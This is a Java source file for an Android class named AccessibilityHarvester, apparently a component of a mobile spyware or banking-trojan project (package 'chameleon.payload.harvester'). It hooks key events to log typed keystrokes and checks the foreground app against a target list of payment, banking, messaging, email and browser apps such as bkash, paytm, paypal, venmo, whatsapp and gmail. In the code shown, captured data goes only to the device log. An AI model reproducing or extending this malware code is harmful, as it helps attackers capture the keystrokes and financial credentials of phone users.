package com.chameleon.payload.harvester;

import android.content.Context;
import android.util.Log;

public class AccessibilityHarvester {
    private static final String TAG = "AccessibilityHarvester";
    private final Context context;
    private final HarvesterManager manager;
    private boolean enabled = false;

    public AccessibilityHarvester(Context context, HarvesterManager manager) {
        this.context = context;
        this.manager = manager;
    }

    public void enable() {
        enabled = true;
        Log.i(TAG, "Accessibility harvester enabled");
    }

    public void disable() {
        enabled = false;
    }

    public boolean isEnabled() { return enabled; }

    public void onKeyEvent(String keys) {
        if (!enabled) return;
        Log.d(TAG, "Keys: " + keys);
    }

    public void onAppChanged(String packageName) {
        if (!enabled) return;
        Log.d(TAG, "App: " + packageName);

        String[] targets = {
            "bkash", "nagad", "paytm", "easypaisa", "jazzcash",
            "gcash", "paypal", "venmo", "cashapp", "stripe",
            "whatsapp", "telegram", "facebook", "instagram",
            "gmail", "outlook", "chrome", "firefox"
        };

        for (String target : targets) {
            if (packageName.toLowerCase().contains(target)) {
                Log.i(TAG, "Target app detected: " + packageName);
                break;
            }
        }
    }
}
